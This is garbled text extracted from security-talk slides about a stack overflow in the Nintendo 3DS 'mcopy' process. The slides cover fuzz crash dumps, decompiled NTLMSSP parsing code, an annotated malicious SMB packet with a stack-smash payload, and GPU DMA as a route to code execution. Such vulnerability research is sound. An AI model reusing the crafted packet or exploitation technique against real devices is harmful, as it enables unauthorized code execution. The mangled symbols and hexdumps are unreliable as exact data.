0x003B:$Security(blob(magic(number(
$...(
0x005F:$Username(data(descriptor(
$$0x00:$Data(length((0x08)(
$$0x02:$Maximum(data(length((0x08)(
$$0x04:$Data(offset((0x08000070)(
$...(
0x00AB:$Username(data((“User”)(
Initial fuzz crash: corrupted packet 
"
Processor:$ARM11$(core$0)$
Exception"type:$data$abort$
Fault"status:$Translation$-$Section$
Current"process:$mcopy$$$$(0004001000024100)$
$
Register"dump:$
$
r0$$$$$$$$$$$$$0885b858$$$$$$$$$$$$r1$$$$$$$$$$$$$1085b724"
r2$$$$$$$$$$$$$ffffffe8$$$$$$$$$$$$r3$$$$$$$$$$$$$00000000$
r4$$$$$$$$$$$$$08002d60$$$$$$$$$$$$r5$$$$$$$$$$$$$00000082$
r6$$$$$$$$$$$$$0885b6b4$$$$$$$$$$$$r7$$$$$$$$$$$$$000000ac$
r8$$$$$$$$$$$$$00000070$$$$$$$$$$$$r9$$$$$$$$$$$$$00000000$
r10$$$$$$$$$$$$00000002$$$$$$$$$$$$r11$$$$$$$$$$$$00000004$
r12$$$$$$$$$$$$80000000$$$$$$$$$$$$sp$$$$$$$$$$$$$08002d28$
lr$$$$$$$$$$$$$00194b44$$$$$$$$$$$$pc$$$$$$$$$$$$$00164e84$
$
cpsr$$$$$$$$$$$80000010$$$$$$$$$$$$dfsr$$$$$$$$$$$00000005$
ifsr$$$$$$$$$$$0000100b$$$$$$$$$$$$far$$$$$$$$$$$$1085b724"
fpexc$$$$$$$$$$00000000$$$$$$$$$$$$fpinst$$$$$$$$$eebc0ac0$
fpinst2$$$$$$$$eebc0ac0$
FAR$$$$$$$$$$$$1085b724$$$$$$$$$$$$Access"type:$Read"
$
Crashing"instruction:$
$ldmmi$r1!,${r3,$r4}$
00000000"
00000008"
00000010"
00000018"
00000020"
00000028"
00000030"
00000038"
00000040"
00000048"
00000050"
00000058"
00000060"
00000068"
00000070"
00000078"
00000080"
00000088"
00000090"
00000098"
000000A0"
000000A8"
000000B0"
000000B8"
000000C0"
000000C8"
000000D0"
000000D8"
000000E0"
000000E8"
ÿSMBs...$
..AÈ....$
........$
..ì.¸’..$
.ÿ....A.$
.......¬$
.....T..$
€
±.NTLMSS
P.......
..@.....
..X.....
..š.....
..p.....
..x.....
..Š....
‚ŠàF.Þ–:
‘Â......
........
....¤Øý|
KëDŒÑ.;
%¹¨*f”vs
i¥à.U.s.
e.r.L.O.
C.A.L.H.
O.S.T..‡
lÈI9Ì‰&h
/.ºŠ=EW.
O.R.K.G.
R.O.U.P.
.....$
FF$53$4D$42$73$00$00$00$
00$18$41$C8$00$00$00$00$
00$00$00$00$00$00$00$00$
00$00$EC$0F$B8$92$03$00$
0C$FF$00$00$00$04$41$0A$
00$01$00$00$00$00$00$AC$
00$00$00$00$00$54$00$00$
80$B1$00$4E$54$4C$4D$53$
53$50$00$03$00$00$00$18$
00$18$00$40$00$00$00$18$
00$18$00$58$00$00$00$12$
00$12$00$9A$00$00$00$08$
00$08$00$70$00$00$08$12$
00$12$00$78$00$00$00$10$
00$10$00$8A$00$00$00$15$
82$8A$E0$46$0C$DE$96$3A$
91$C2$18$00$00$00$00$00$
00$00$00$00$00$00$00$00$
00$00$00$16$A4$D8$FD$7C$
4B$EB$44$8C$D1$0C$3B$25$
B9$A8$2A$66$94$76$73$69$
A5$E0$2E$55$00$73$00$65$
00$72$00$4C$00$4F$00$43$
00$41$00$4C$00$48$00$4F$
00$53$00$54$00$17$87$6C$
C8$49$39$CC$89$26$68$2F$
90$BA$8A$3D$45$57$00$4F$
00$52$00$4B$00$47$00$52$
00$4F$00$55$00$50$00$00$
00$00$00$00$00$
Initial fuzz crash: exception dump 
int$SecurityBlob::parse(u8*$buffer,$int$length)$
{$
$$int$result$=$-1;$
$$if$($security_blob_len$>=$0x58$)$
$${$
$$$$int$offset$=$this->unpack_ntlmssp_header(buffer,$length);$
$
$$$$if$($offset$>=$0$)$
$$$${$
$$$$$$for(int$i$=$0;$i$unpack_length_offset(buffer$+$offset,$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$&this->fields[i]);$
$$$$$$}$
$
$$$$$$offset$+=$this->parse_negociate_flags(buffer$+$offset);$
$
$$$$$$int$username_length$=$this->fields[3].length;$
$$$$$$if$($username_length$&&$username_length$username_buffer$=$malloc(username_length$&$0xFFFFFFFE);$
$$$$$$$$memmove(this->username_buffer,$
$$$$$$$$$$$$$$$$buffer$+$this->fields[3].offset,$
$$$$$$$$$$$$$$$$username_length);$
$$$$$$$$offset$+=$username_length;$
$$$$$$}$
$
$$$$$$$...$
$
$$$$}$
$$}$
$$return$result;$
}$
$
00000000"
00000008"
00000010"
00000018"
00000020"
00000028"
00000030"
00000038"
00000040"
00000048"
00000050"
00000058"
00000060"
00000068"
00000070"
00000078"
00000080"
00000088"
00000090"
00000098"
000000A0"
000000A8"
000000B0"
000000B8"
000000C0"
000000C8"
000000D0"
000000D8"
000000E0"
000000E8"
ÿSMBs...$
..AÈ....$
........$
..ì.¸’..$
.ÿ....A.$
.......¬$
.....T..$
€
±.NTLMSS
P.......
..@.....
..X.....
..š.....
..p.....
..x.....
..Š....
‚ŠàF.Þ–:
‘Â......
........
....¤Øý|
KëDŒÑ.;
%¹¨*f”vs
i¥à.U.s.
e.r.L.O.
C.A.L.H.
O.S.T..‡
lÈI9Ì‰&h
/.ºŠ=EW.
O.R.K.G.
R.O.U.P.
.....$
FF$53$4D$42$73$00$00$00$
00$18$41$C8$00$00$00$00$
00$00$00$00$00$00$00$00$
00$00$EC$0F$B8$92$03$00$
0C$FF$00$00$00$04$41$0A$
00$01$00$00$00$00$00$AC$
00$00$00$00$00$54$00$00$
80$B1$00$4E$54$4C$4D$53$
53$50$00$03$00$00$00$18$
00$18$00$40$00$00$00-18$
00$18$00$58$00$00$00-12$
00$12$00$9A$00$00$00-08$
00$08$00$70$00$00$08-12$
00$12$00$78$00$00$00-10$
00$10$00$8A$00$00$00$15$
82$8A$E0$46$0C$DE$96$3A$
91$C2$18$00$00$00$00$00$
00$00$00$00$00$00$00$00$
00$00$00$16$A4$D8$FD$7C$
4B$EB$44$8C$D1$0C$3B$25$
B9$A8$2A$66$94$76$73$69$
A5$E0$2E$55$00$73$00$65$
00$72$00$4C$00$4F$00$43$
00$41$00$4C$00$48$00$4F$
00$53$00$54$00$17$87$6C$
C8$49$39$CC$89$26$68$2F$
90$BA$8A$3D$45$57$00$4F$
00$52$00$4B$00$47$00$52$
00$4F$00$55$00$50$00$00$
00$00$00$00$00$
Initial fuzz crash: code 
int$SecurityBlob::parse(u8*$buffer,$int$length)$
{$
$$...$
$$for(int$i$=$0;$i$unpack_length_offset(buffer$+$offset,$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$&this->field[i]);$
$$}$
$$...$
}$
$
int$sub_1910C4()$
{$
$$...$
$$secblob->parse(buffer,$length);$
$
$$if(secblob->fields[1].length$!=$0x18)$
$$$$secblob->sub_18EA84(0x18,$...);$
$$else$
$$$$secblob->sub_18EBB0(secblob->fields[1].length,$...);$
$$...$
}$
int$SecurityBlob::sub_18EBB0(...)$
{$
$$wchar_t$local_buffer[0x20];$
$
$$...$
$
$$memmove(local_buffer,$this->domain_buffer,$this->domain_length);$
$
$$...$
}$
Exploitable vuln: code 
00000000"
00000008"
00000010"
00000018"
00000020"
00000028"
00000030"
00000038"
00000040"
00000048"
00000050"
00000058"
00000060"
00000068"
00000070"
00000078"
00000080"
00000088"
00000090"
00000098"
000000A0"
000000A8"
000000B0"
000000B8"
000000C0"
000000C8"
000000D0"
000000D8"
000000E0"
000000E8"
""..."
ÿSMBs...$
..AÈ....$
........$
..ì.¸’..$
.ÿ....A.$
.......¬$
.....T..$
€
±.NTLMSS
P.......
..@.....
..X.....
..š.....
..p.....
..x.....
..Š....
‚ŠàF.Þ–:
‘Â......
........
....¤Øý|
KëDŒÑ.;
%¹¨*f”vs
i¥à.U.s.
e.r.L.O.
C.A.L.H.
O.S.T..‡
lÈI9Ì‰&h
/.ºŠ=EW.
O.R.K.G.
R.O.U.P.
........$
FF$53$4D$42$73$00$00$00$
00$18$41$C8$00$00$00$00$
00$00$00$00$00$00$00$00$
00$00$EC$0F$B8$92$03$00$
0C$FF$00$00$00$04$41$0A$
00$01$00$00$00$00$00$AC$
00$00$00$00$00$54$00$00$
80$B1$00$4E$54$4C$4D$53$
53$50$00$03$00$00$00$18$
00$18$00$40$00$00$00$10$
00$10$00$58$00$00$00$10"
0C"10"0C$9A$00$00$00$08$
00$08$00$70$00$00$00$12$
00$12$00$78$00$00$00$10$
00$10$00$8A$00$00$00$15$
82$8A$E0$46$0C$DE$96$3A$
91$C2$18$00$00$00$00$00$
00$00$00$00$00$00$00$00$
00$00$00$16$A4$D8$FD$7C$
4B$EB$44$8C$D1$0C$3B$25$
B9$A8$2A$66$94$76$73$69$
A5$E0$2E$55$00$73$00$65$
00$72$00$4C$00$4F$00$43$
00$41$00$4C$00$48$00$4F$
00$53$00$54$00$17$87$6C$
C8$49$39$CC$89$26$68$2F$
90$BA$8A$3D$45$57$00$4F$
00$52$00$4B$00$47$00$52$
00$4F$00$55$00$50$00$00$
00$00$00$00$00$00$00$00$
$$$$$$$$$$...$
0x0000:$SMB(magic(number(
0x0004:$SMB(command((0x73:(Session(Setup(AndX)(
$...(
0x002F:$Security(blob(size((0xAC(bytes)(
$...(
0x003B:$Security(blob(magic(number(
$...(
0x0057:$Domain(name(data(descriptor(
$$0x00:$Data(length((0xC10$>$0x20)(
$$0x02:$Maximum(data(length((0xC10$>$0x20)(
$$0x04:$Data(offset((0x9A)(
$...(
0x00AB:$Stack(smash(overwrite(payload((0xC10(bytes)(
$...(
0x0057:$NTLM(response(data(descriptor(
$$0x00:$Data(length((0x10$!=$0x18)(
$$0x02:$Maximum(data(length((0x10$!=$0x18)(
$$0x04:$Data(offset((0x9A)(
Exploitable vuln: corrupted packet 
Code execution? 
•  Strict(DEP(–(OS(never(allocates(RWX(memory(in(user-mode(
•  Only(2(system(modules(can(create(more(executable(memory(
•  loader:(loads(main(process(binaries(
•  ro:(loads(dynamic(libraries((CROs(–(think(DLL(equivalent(for(3DS)(
•  But(what(if(we(don’t(need(more(executable(memory…?(
Memory 
CPUs 
Devices 
ARM9(
ARM11(
GPU(
CRYPTO(
NAND(
Physical memory region separation 
MCOPY(
SYSTEM( BASE(
FCRAM(
K/P9(
Kernel11(
WRAM(
VRAM(
ARM9(
internal(
Memory 
CPUs 
Devices 
ARM9(
ARM11(
GPU(
CRYPTO(
NAND(
GPU DMA 
SYSTEM( BASE(
FCRAM(
K/P9(
Kernel11(
WRAM(
VRAM(
ARM9(
internal(
MCOPY(
Memory 
CPUs 
Devices 
ARM9(
ARM11(
GPU(
CRYPTO(
NAND(
GPU DMA: range reduction mitigation 
SYSTEM( BASE(
FCRAM(
K/P9(
Kernel11(
WRAM(
VRAM(
ARM9(
internal(
MCOPY(
FCRAM 
Using DMA to achieve code execution 
mcopy 
0x00100000$
0x20000000$